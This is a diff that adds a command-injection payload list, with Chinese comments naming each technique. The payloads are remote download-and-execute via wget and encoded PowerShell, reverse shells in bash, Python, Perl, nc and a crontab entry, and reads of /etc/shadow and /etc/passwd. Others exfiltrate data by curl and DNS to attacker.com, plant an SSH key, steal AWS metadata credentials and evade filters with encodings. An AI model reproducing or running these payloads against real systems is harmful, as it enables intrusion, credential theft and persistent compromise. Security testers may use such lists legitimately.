@@ -1,0 +1,40 @@
+# 命令注入 - 远程下载并执行木马
+; wget http://attacker.com/shell.sh -O /tmp/.x; bash /tmp/.x
+# 命令注入 - 反弹 Shell (bash TCP)
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+# 命令注入 - 读取系统密码文件
+| cat /etc/shadow
+# 命令注入 - 写入 SSH 公钥持久化
+; echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
+# 命令注入 - 管道符绕过 + DNS 外带数据
+|curl attacker.com/`whoami`||
+# 命令注入 - 反引号命令外带数据到攻击者服务器
+`cat /etc/shadow|base64|curl attacker.com -d @-`
+# 命令注入 - base64 编码绕过执行
+; echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | bash
+# 命令注入 - $IFS 无空格绕过读取密码文件
+;cat$IFS/etc/passwd
+# 命令注入 - 通配符绕过命令执行
+;/??n?/?at /???/????wd
+# 命令注入 - PowerShell 编码执行下载木马 (Windows)
+; powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQAKAA==
+# 命令注入 - 美元符号命令替换绕过过滤
+$(cat /etc/passwd)
+# 命令注入 - Python 反弹 Shell 绕过 bash 限制
+; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# 命令注入 - Perl 反弹 Shell
+; perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
+# 命令注入 - 十六进制编码绕过关键词过滤
+; $(echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
+# 命令注入 - 八进制编码绕过关键词过滤
+;eval $'\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144'
+# 命令注入 - nc 反弹 Shell
+; nc attacker.com 4444 -e /bin/bash
+# 命令注入 - DNS 外带数据泄露文件内容
+; for l in $(cat /etc/passwd|base64 -w0|fold -w63);do dig $l.attacker.com;done
+# 命令注入 - nmap 扫描内网端口
+; nmap -Pn -p 22,80,443,3306,6379 10.0.0.0/24
+# 命令注入 - curl 读取云元数据 (AWS IMDSv1)
+; curl http://169.254.169.254/latest/meta-data/iam/security-credentials/admin -o /tmp/aws.txt; curl attacker.com -d @/tmp/aws.txt
+# 命令注入 - 写入 crontab 定时任务持久化
+; echo '* * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1' | crontab -
